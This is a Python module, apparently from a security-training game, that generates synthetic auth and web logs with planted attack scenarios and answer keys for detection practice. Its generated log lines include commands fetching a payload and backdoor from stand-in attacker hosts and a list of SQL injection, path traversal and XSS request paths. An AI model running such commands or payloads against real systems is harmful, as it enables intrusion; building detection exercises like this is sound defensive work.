"""
LogForge — Synthetic Log Generator
------------------------------------
Generates realistic fake log files with planted attack scenarios.
This is the engine behind Layer 2 of the game.

Usage:
  from modules.logforge import forge
  log_text = forge("brute_force", difficulty="medium", fmt="auth")

The generator creates:
  - Realistic baseline "noise" (legitimate logins, normal web traffic)
  - One or more planted attack patterns hidden in the noise
  - The harder the difficulty, the more noise and the subtler the attack

Scenario types:
  brute_force        — many failures from one IP, then success
  credential_stuffing — one IP, many different usernames
  impossible_travel   — same user, two impossible countries
  after_hours        — legitimate user logs in at 3am for the first time
  insider_threat     — user escalates privileges immediately after login
  web_scan           — automated scanner probing for vulnerabilities
  slow_burn          — distributed brute force from many IPs (APT style)
"""

import random
import string
from datetime import datetime, timedelta
from typing import Literal

# ── Realistic data pools ──────────────────────────────────────────────────────

USERNAMES = [
    "alice", "bob", "carol", "dave", "eve", "frank", "grace", "henry",
    "ivan", "judy", "kevin", "linda", "mike", "nancy", "oscar", "pat",
    "quinn", "rachel", "steve", "tina", "ubuntu", "victor", "wendy", "xander",
    "admin", "root", "user", "test", "guest", "deploy", "service", "backup",
    "jenkins", "git", "www-data", "postgres", "mysql",
]

LEGIT_USERNAMES = ["alice", "bob", "carol", "dave", "frank", "grace", "henry"]

LEGIT_IPS = [
    "10.0.0.15", "10.0.0.23", "10.0.0.47", "192.168.1.101",
    "192.168.1.105", "192.168.1.200",
]

# Real-ish attacker IPs (public range, fictional)
ATTACKER_IPS = [
    "185.220.101.47",  # Tor exit node range
    "45.33.32.156",
    "194.165.16.11",
    "198.54.117.197",
    "103.21.244.0",
    "91.108.4.5",
    "5.188.86.172",
]

# Geographically diverse attacker IPs for impossible travel
TRAVEL_IPS = {
    "New York, US":    ("72.229.28.185",   40.71,  -74.01),
    "Tokyo, JP":       ("153.214.0.0",     35.68,  139.69),
    "London, UK":      ("5.148.180.1",     51.51,   -0.13),
    "Moscow, RU":      ("95.213.0.1",      55.75,   37.62),
    "Sydney, AU":      ("203.21.75.1",    -33.87,  151.21),
    "São Paulo, BR":   ("189.28.128.1",   -23.55,  -46.63),
}

SCAN_USER_AGENTS = [
    "sqlmap/1.6.4#pip",
    "Nikto/2.1.6",
    "gobuster/3.4",
    "Mozilla/5.0 (compatible; DirBuster-1.0)",
    "masscan/1.3",
]

LEGIT_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0",
]

ATTACK_PATHS = [
    "/?id=1 UNION SELECT 1,2,3--",
    "/admin/config.php",
    "/../../../etc/passwd",
    "/wp-admin/",
    "/.env",
    "/.git/config",
    "/phpmyadmin/",
    "/login?user=admin'--",
    "/search?q=<script>alert(1)</script>",
    "/api/v1/users?id=1 OR 1=1",
]

LEGIT_PATHS = [
    "/", "/index.html", "/about", "/contact", "/login",
    "/dashboard", "/api/v1/status", "/static/main.css",
    "/favicon.ico", "/robots.txt",
]


# ── Timestamp helpers ─────────────────────────────────────────────────────────

def _ts(base: datetime, delta_secs: float) -> str:
    """Format an auth.log style timestamp."""
    t = base + timedelta(seconds=delta_secs)
    return t.strftime("%b %e %H:%M:%S").replace("  ", " ")


def _web_ts(base: datetime, delta_secs: float) -> str:
    """Format an Apache/Nginx log timestamp."""
    t = base + timedelta(seconds=delta_secs)
    return t.strftime("%d/%b/%Y:%H:%M:%S +0000")


def _rand_port() -> int:
    return random.randint(40000, 65535)


# ── Auth log line generators ──────────────────────────────────────────────────

def _auth_fail(ts: str, ip: str, user: str) -> str:
    return f"{ts} server sshd[{random.randint(1000,9999)}]: Failed password for {user} from {ip} port {_rand_port()} ssh2"

def _auth_invalid(ts: str, ip: str, user: str) -> str:
    return f"{ts} server sshd[{random.randint(1000,9999)}]: Invalid user {user} from {ip} port {_rand_port()}"

def _auth_success(ts: str, ip: str, user: str) -> str:
    return f"{ts} server sshd[{random.randint(1000,9999)}]: Accepted password for {user} from {ip} port {_rand_port()} ssh2"

def _auth_disconnect(ts: str, ip: str, user: str) -> str:
    return f"{ts} server sshd[{random.randint(1000,9999)}]: Disconnected from user {user} {ip} port {_rand_port()}"

def _auth_sudo(ts: str, user: str, cmd: str) -> str:
    return f"{ts} server sudo[{random.randint(1000,9999)}]: {user} : TTY=pts/0 ; PWD=/home/{user} ; USER=root ; COMMAND={cmd}"


# ── Web log line generator ────────────────────────────────────────────────────

def _web_req(ts: str, ip: str, path: str, status: int = 200, ua: str | None = None) -> str:
    ua    = ua or random.choice(LEGIT_USER_AGENTS)
    size  = random.randint(200, 8000)
    return f'{ip} - - [{ts}] "GET {path} HTTP/1.1" {status} {size} "-" "{ua}"'


# ── Noise generators ──────────────────────────────────────────────────────────

def _baseline_auth(base: datetime, duration_mins: int, density: int = 3) -> list[tuple[float, str]]:
    """Generate realistic legitimate SSH traffic as (offset_secs, line) pairs."""
    lines = []
    for _ in range(density * duration_mins):
        offset = random.uniform(0, duration_mins * 60)
        user   = random.choice(LEGIT_USERNAMES)
        ip     = random.choice(LEGIT_IPS)
        ts     = _ts(base, offset)
        lines.append((offset, _auth_success(ts, ip, user)))
        lines.append((offset + 1, _auth_disconnect(_ts(base, offset + random.randint(30, 3600)), ip, user)))
    return lines


def _baseline_web(base: datetime, duration_mins: int, density: int = 10) -> list[tuple[float, str]]:
    """Generate realistic web traffic noise."""
    lines = []
    for _ in range(density * duration_mins):
        offset = random.uniform(0, duration_mins * 60)
        ip     = random.choice(LEGIT_IPS)
        path   = random.choice(LEGIT_PATHS)
        status = random.choices([200, 200, 200, 301, 404], weights=[7, 7, 7, 2, 1])[0]
        lines.append((offset, _web_req(_web_ts(base, offset), ip, path, status)))
    return lines


# ── Scenario builders ─────────────────────────────────────────────────────────

def _scenario_brute_force(base: datetime, difficulty: str) -> list[tuple[float, str]]:
    lines      = []
    ip         = random.choice(ATTACKER_IPS)
    target     = random.choice(["root", "admin", "ubuntu"])
    n_attempts = {"easy": 40, "medium": 80, "hard": 150}[difficulty]
    start      = random.uniform(30, 200)

    for i in range(n_attempts):
        offset = start + i * random.uniform(0.5, 3.0)
        ts     = _ts(base, offset)
        user   = target if difficulty != "hard" else random.choice([target, "admin", "root"])
        lines.append((offset, _auth_fail(ts, ip, user)))

    # The attack succeeds
    success_offset = start + n_attempts * 2.0 + random.uniform(5, 30)
    ts = _ts(base, success_offset)
    lines.append((success_offset, _auth_success(ts, ip, target)))
    lines.append((success_offset + 3, _auth_sudo(_ts(base, success_offset + 3), target, "/bin/bash")))
    return lines


def _scenario_credential_stuffing(base: datetime, difficulty: str) -> list[tuple[float, str]]:
    lines  = []
    ip     = random.choice(ATTACKER_IPS)
    n_users = {"easy": 20, "medium": 40, "hard": 80}[difficulty]
    targets = random.sample(USERNAMES, min(n_users, len(USERNAMES)))
    start  = random.uniform(30, 150)

    for i, user in enumerate(targets):
        offset = start + i * random.uniform(1.0, 4.0)
        ts     = _ts(base, offset)
        lines.append((offset, _auth_invalid(ts, ip, user)))
    return lines


def _scenario_impossible_travel(base: datetime, difficulty: str) -> list[tuple[float, str]]:
    lines    = []
    user     = random.choice(LEGIT_USERNAMES)
    loc_a    = random.choice(list(TRAVEL_IPS.items()))
    loc_b    = random.choice([l for l in TRAVEL_IPS.items() if l != loc_a])
    ip_a     = loc_a[1][0]
    ip_b     = loc_b[1][0]
    gap_mins = {"easy": 10, "medium": 25, "hard": 45}[difficulty]

    t_a = random.uniform(60, 200)
    t_b = t_a + gap_mins * 60

    ts_a = _ts(base, t_a)
    ts_b = _ts(base, t_b)

    lines.append((t_a, _auth_success(ts_a, ip_a, user)))
    lines.append((t_a + 300, _auth_disconnect(_ts(base, t_a + 300), ip_a, user)))
    lines.append((t_b, _auth_success(ts_b, ip_b, user)))
    return lines


def _scenario_after_hours(base: datetime, difficulty: str) -> list[tuple[float, str]]:
    lines = []
    user  = random.choice(LEGIT_USERNAMES)
    ip    = random.choice(LEGIT_IPS)

    # Establish a history of 9am logins
    for day_offset in range(5):
        offset = day_offset * 3600 + 9 * 3600 / (day_offset + 1)
        ts = _ts(base - timedelta(days=5 - day_offset), 0)
        lines.append((offset, _auth_success(_ts(base, offset % 3600), ip, user)))

    # The suspicious 3am login
    odd_hour = random.choice([2, 3, 4])
    odd_offset = odd_hour * 3600 + random.randint(0, 3600)
    odd_ip = random.choice(ATTACKER_IPS) if difficulty == "hard" else ip
    lines.append((odd_offset, _auth_success(_ts(base, odd_offset), odd_ip, user)))

    # They immediately run a weird command
    if difficulty in ("medium", "hard"):
        lines.append((odd_offset + 15, _auth_sudo(_ts(base, odd_offset + 15), user, "/usr/bin/curl http://evil.example.com/payload.sh")))
    return lines


def _scenario_insider_threat(base: datetime, difficulty: str) -> list[tuple[float, str]]:
    lines = []
    user  = random.choice(LEGIT_USERNAMES)
    ip    = random.choice(ATTACKER_IPS)
    start = random.uniform(100, 300)

    ts = _ts(base, start)
    lines.append((start, _auth_success(ts, ip, user)))
    lines.append((start + 8, _auth_sudo(_ts(base, start + 8), user, "/bin/bash")))
    lines.append((start + 12, _auth_sudo(_ts(base, start + 12), user, "/usr/bin/wget http://attacker.example.com/backdoor -O /tmp/.hidden")))
    lines.append((start + 20, _auth_sudo(_ts(base, start + 20), user, "/bin/chmod +x /tmp/.hidden")))
    return lines


def _scenario_web_scan(base: datetime, difficulty: str) -> list[tuple[float, str]]:
    lines = []
    ip    = random.choice(ATTACKER_IPS)
    ua    = random.choice(SCAN_USER_AGENTS)
    n_probes = {"easy": 20, "medium": 60, "hard": 120}[difficulty]
    start = random.uniform(20, 100)

    for i in range(n_probes):
        offset = start + i * random.uniform(0.2, 1.5)
        path   = random.choice(ATTACK_PATHS + LEGIT_PATHS[:3])
        status = random.choice([200, 403, 404, 500])
        lines.append((offset, _web_req(_web_ts(base, offset), ip, path, status, ua)))
    return lines


def _scenario_slow_burn(base: datetime, difficulty: str) -> list[tuple[float, str]]:
    """Distributed brute force from many IPs — APT style, very slow."""
    lines   = []
    target  = random.choice(LEGIT_USERNAMES)
    n_ips   = {"easy": 5, "medium": 15, "hard": 30}[difficulty]
    ips     = [f"45.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}" for _ in range(n_ips)]
    duration = 300 * 60  # 5 hours spread out

    for i, ip in enumerate(ips):
        offset = random.uniform(0, duration)
        ts = _ts(base, offset)
        lines.append((offset, _auth_fail(ts, ip, target)))
        if difficulty == "easy" and i == n_ips - 1:
            # Last IP succeeds in easy mode
            lines.append((offset + 60, _auth_success(_ts(base, offset + 60), ip, target)))
    return lines


# ── Public API ────────────────────────────────────────────────────────────────

SCENARIOS = {
    "brute_force":         _scenario_brute_force,
    "credential_stuffing": _scenario_credential_stuffing,
    "impossible_travel":   _scenario_impossible_travel,
    "after_hours":         _scenario_after_hours,
    "insider_threat":      _scenario_insider_threat,
    "web_scan":            _scenario_web_scan,
    "slow_burn":           _scenario_slow_burn,
}

Format = Literal["auth", "web"]


def forge(
    scenario:   str,
    difficulty: Literal["easy", "medium", "hard"] = "medium",
    fmt:        Format = "auth",
    seed:       int | None = None,
) -> tuple[str, dict]:
    """
    Generate a synthetic log file for a given attack scenario.

    Returns:
        (log_text, metadata) where metadata contains the answer key
        (what to look for, where the attack is planted).
    """
    if seed is not None:
        random.seed(seed)

    if scenario not in SCENARIOS:
        raise ValueError(f"Unknown scenario: {scenario}. Choose from: {list(SCENARIOS.keys())}")

    base         = datetime.now().replace(hour=0, minute=0, second=0, microsecond=0)
    duration     = 480  # 8 hours of logs (minutes)
    noise_density = {"easy": 2, "medium": 5, "hard": 10}[difficulty]

    # Generate baseline noise
    if fmt == "auth":
        noise = _baseline_auth(base, duration, density=noise_density)
    else:
        noise = _baseline_web(base, duration, density=noise_density)

    # Generate attack events
    attack_lines = SCENARIOS[scenario](base, difficulty)

    # Merge and sort by timestamp
    all_lines = noise + attack_lines
    all_lines.sort(key=lambda x: x[0])

    log_text = "\n".join(line for _, line in all_lines)

    metadata = {
        "scenario":    scenario,
        "difficulty":  difficulty,
        "format":      fmt,
        "answer_key":  _answer_key(scenario),
        "total_lines": len(all_lines),
        "attack_lines": len(attack_lines),
    }

    return log_text, metadata


def _answer_key(scenario: str) -> dict:
    keys = {
        "brute_force":         {"look_for": "Multiple LOGIN_FAIL from same IP → LOGIN_SUCCESS", "category": "BRUTE_FORCE_SUCCESS"},
        "credential_stuffing": {"look_for": "One IP, many different usernames failing", "category": "CREDENTIAL_STUFFING"},
        "impossible_travel":   {"look_for": "Same user, two distant IPs within minutes", "category": "IMPOSSIBLE_TRAVEL"},
        "after_hours":         {"look_for": "Unusual login time vs user history", "category": "AFTER_HOURS_ACCESS"},
        "insider_threat":      {"look_for": "Remote login → immediate sudo commands", "category": "PRIVILEGE_ESCALATION"},
        "web_scan":            {"look_for": "Scanner user-agent + attack URL patterns", "category": "WEB_SCANNER"},
        "slow_burn":           {"look_for": "Many IPs, each with few attempts, same target", "category": "BRUTE_FORCE"},
    }
    return keys.get(scenario, {})
